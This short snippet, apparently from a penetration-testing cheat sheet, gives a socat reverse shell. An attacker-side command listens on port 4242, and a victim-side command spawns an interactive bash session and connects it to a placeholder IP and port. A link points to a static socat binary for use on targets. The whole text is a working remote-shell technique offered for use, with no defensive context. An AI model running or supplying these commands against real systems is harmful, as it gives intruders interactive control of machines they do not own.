```powershell
user@attackker $ socat file:`tty`,raw,echo=0 TCP-L:4242

user@victim $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<port>
```
Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)